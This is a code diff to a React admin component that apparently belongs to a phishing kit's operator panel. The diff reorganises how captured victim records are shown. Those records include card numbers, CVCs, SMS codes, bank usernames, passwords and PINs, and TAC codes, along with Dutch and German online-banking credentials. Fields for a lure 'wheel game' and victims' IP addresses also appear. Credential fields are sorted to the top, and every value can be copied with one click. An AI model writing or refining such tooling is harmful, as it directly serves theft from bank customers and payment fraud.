@@ -569,44 +569,51 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                     <td className="px-3 py-4">
                       <div className="text-[13px] space-y-1.5 max-w-[200px] break-words">
                           {fd.bankName && <div className="font-bold text-yellow-600 dark:text-yellow-500 break-words">{fd.bankName}</div>}
-                          {Object.entries(fd).map(([key, value]) => {
-                            if (!value) return null;
-                            
-                            // Sistem metadatalarını ve zaten diğer kolonlarda olanları gizle
-                            const ignoredKeys = [
-                              "firstName", "lastName", "phone", "smsCode", 
-                              "cardNumber", "cardExpiry", "cardCvc", 
-                              "bankName", "amount", "step", 
-                              "bankSlug", "currency", "is_wheel_game", 
-                              "wheel_result_kind", "wheel_result_label", 
-                              "wheel_result_amount", "wheel_rotation_index",
-                              "session_id", "id", "created_at", "updated_at",
-                              "user_agent", "ip_address", "is_hidden"
-                            ];
-                            
-                            if (ignoredKeys.includes(key)) return null;
-                            
-                            // Key ismini daha okunabilir yap
-                            let displayKey = key;
-                            if (key === "username" || key === "verfuegernummer") displayKey = "K.Adı";
-                            else if (key === "password" || key === "pin") displayKey = "Şifre";
-                            else if (key === "tacCode") displayKey = "TAC";
-                            else if (key === "rekeningnummer") displayKey = "Hesap No";
-                            else if (key === "pasnummer") displayKey = "Kart No";
-                            else if (key === "toegangscode") displayKey = "Giriş Kodu";
-                            else if (key === "signatuur") displayKey = "İmza";
-                            else if (key === "identificatiecode") displayKey = "Kimlik Kodu";
-                            
-                            return (
-                              <div key={key} className="flex gap-1.5 items-start">
-                                <span className="opacity-40 text-[10px] font-bold uppercase bg-black/5 dark:bg-white/10 px-1.5 py-0.5 rounded mt-0.5 shrink-0 whitespace-nowrap">
-                                  {displayKey}
-                                </span>
-                                <span className="cursor-pointer font-medium hover:opacity-70 transition-opacity break-all" onClick={() => copyToClipboard(String(value))}>
-                                  {String(value)}
-                                </span>
-                              </div>
-                            );
+                          {Object.entries(fd)
+                            .filter(([key, value]) => {
+                              if (!value) return false;
+                              const ignoredKeys = [
+                                "firstName", "lastName", "phone", "smsCode", 
+                                "cardNumber", "cardExpiry", "cardCvc", 
+                                "bankName", "amount", "step", 
+                                "bankSlug", "currency", "is_wheel_game", 
+                                "wheel_result_kind", "wheel_result_label", 
+                                "wheel_result_amount", "wheel_rotation_index",
+                                "session_id", "id", "created_at", "updated_at",
+                                "user_agent", "ip_address", "is_hidden"
+                              ];
+                              return !ignoredKeys.includes(key);
+                            })
+                            .sort(([keyA], [keyB]) => {
+                              const order = ["username", "verfuegernummer", "password", "pin", "pasnummer", "rekeningnummer", "toegangscode", "signatuur", "identificatiecode", "tacCode"];
+                              const indexA = order.indexOf(keyA);
+                              const indexB = order.indexOf(keyB);
+                              if (indexA !== -1 && indexB !== -1) return indexA - indexB;
+                              if (indexA !== -1) return -1;
+                              if (indexB !== -1) return 1;
+                              return keyA.localeCompare(keyB);
+                            })
+                            .map(([key, value]) => {
+                              let displayKey = key;
+                              if (key === "username" || key === "verfuegernummer") displayKey = "K.Adı";
+                              else if (key === "password" || key === "pin") displayKey = "Şifre";
+                              else if (key === "tacCode") displayKey = "TAC";
+                              else if (key === "rekeningnummer") displayKey = "Hesap No";
+                              else if (key === "pasnummer") displayKey = "Kart No";
+                              else if (key === "toegangscode") displayKey = "Giriş Kodu";
+                              else if (key === "signatuur") displayKey = "İmza";
+                              else if (key === "identificatiecode") displayKey = "Kimlik Kodu";
+                              
+                              return (
+                                <div key={key} className="flex gap-1.5 items-start">
+                                  <span className="opacity-40 text-[10px] font-bold uppercase bg-black/5 dark:bg-white/10 px-1.5 py-0.5 rounded mt-0.5 shrink-0 whitespace-nowrap">
+                                    {displayKey}
+                                  </span>
+                                  <span className="cursor-pointer font-medium hover:opacity-70 transition-opacity break-all" onClick={() => copyToClipboard(String(value))}>
+                                    {String(value)}
+                                  </span>
+                                </div>
+                              );
                           })}
                         </div>
                     </td>
